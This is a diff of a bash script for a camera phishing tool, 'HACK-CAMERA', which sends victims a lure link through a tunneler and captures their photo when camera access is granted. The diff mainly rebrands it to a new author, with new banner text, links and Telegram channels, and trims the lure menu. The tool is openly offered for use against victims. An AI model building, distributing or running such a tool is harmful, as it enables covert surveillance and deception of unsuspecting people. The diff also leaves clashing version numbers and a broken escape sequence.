@@ -1,12 +1,12 @@
 #!/bin/bash
 
 # HACK-CAMERA 
-# Version    : 2.1
+# Version    : 1.2
 # Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : X PHANTOM PH4N70M
-# Github     : https://github.com/hackerxphantom
-# Join Us    : https://bit.ly/3PV3S3r
-# Date       : 29-05-2022
+# Author     : Mojib Rsm
+# Github     : https://github.com/Mojib-Rsm
+# Join Us    : https://t.me/MrTools_BD
+# Date       : 26-05-2023
 # Language   : Shell, HTML, Css
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -41,7 +41,7 @@ ${blue} | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \
 ${blue} | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| |  _| | |_) |  / _ \  
 ${blue} |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | |___|  _ <  / ___ \ 
 ${blue} |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\
-${green}                                               [By X PHANTOM (PH4N7OM)]
+${green}                                               [By Mojib Rsm (MrTeamTiger)]
 "
 
 # Package Installer
@@ -132,7 +132,7 @@ replacer() {
 stty -echoctl
 
 # Detect UserInterrupt
-trap "echo -e '\n${success}Thanks for Using! Visit Site : https://bit.ly/3LAy80f\n'; exit" 2
+trap "echo -e '\n${success}Thanks for Using! Visit Site : https://mojibrsm.com\n'; exit" 2
 
 # Termux
 if [[ -d /data/data/com.termux/files/home ]]; then
@@ -355,10 +355,7 @@ clear
 echo -e "$logo"
 sleep 1
 echo -e "${ask}Choose an option:
-${red}[${white}1${red}] ${cyan}Jio Recharge
-${red}[${white}2${red}] ${cyan}Festival
-${red}[${white}3${red}] ${cyan}Live Youtube
-${red}[${white}4${red}] ${cyan}Online Meeting
+${red}[${white}1${red}] ${cyan}Hack Camera
 ${red}[${white}d${red}] ${cyan}Change Image Directory (current: ${red}${FOL}${yellow})
 ${red}[${white}p${red}] ${cyan}Change Default Port (current: ${red}${PORT}${yellow})
 ${red}[${white}t${red}] ${cyan}Change Default Tunneler (current: ${red}${TN}${yellow})
@@ -368,7 +365,7 @@ ${red}[${white}0${red}] ${cyan}Exit${blue}
 "
 
 sleep 1
-printf "${cyan}\nXPHANTOM${nc}@${blue}PH4N70M ${red}$ ${nc}"
+printf "${cyan}\nMojibrsm${nc}@${blue}MrTeamTiger ${red}$ ${nc}"
 read option
 # Select template
     if echo $option | grep -q "1"; then
@@ -376,7 +373,7 @@ read option
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${cyan}\n\nMojibrsm${nc}@${blue}MrTeamTiger ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -387,7 +384,7 @@ read option
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nXPhantom${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\Mojibrsm${nc}@${blue}MrTeamTiger ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -405,7 +402,7 @@ read option
             export TN="Cloudflared"
         fi
     elif echo $option | grep -q "i"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\n\nMojibrsm${nc}@${blue}MrTeamTiger ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -418,17 +415,18 @@ read option
     elif echo $option | grep -q "x"; then
         clear
         echo -e "$logo"
-        echo -e "$red[ToolName]  ${cyan}  :[HACK-CAMERA]
+        echo -e "$red[ToolName]  ${cyan}  :[Camera-Hack]
 $red[Version]    ${cyan} :[2.1]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[XPHANTOM PH4N70M]
-$red[Github]     ${cyan} :[https://github.com/hackerxphantom] 
-$red[Join us]    ${cyan} :[https://bit.ly/3PV3S3r]
-$red[Telegarm]   ${cyan} :[https://t.me/x_PH4N7OM]"
-printf "${cyan}\nXPHANTOM${nc}@${cyan}XPH4N70M ${red}$ ${nc}"
+$red[Author]     ${cyan} :[Mojib Rsm]
+$red[Powered by] ${cyan} :[MrTeamTiger]
+$red[Github]     ${cyan} :[https://github.com/Mojib-Rsm] 
+$red[Join us]    ${cyan} :[https://t.me/MrTools_BD]
+$red[Telegarm]   ${cyan} :[https://t.me/MrBomberBD]"
+printf "${cyan}\nMojibrsm${nc}@${cyan}MrTeamTiger ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://bit.ly/3PV3S3r"
+        xdg-open "https://team.mojibrsm.com/"
     elif echo $option | grep -q "0"; then
         exit 0
     else
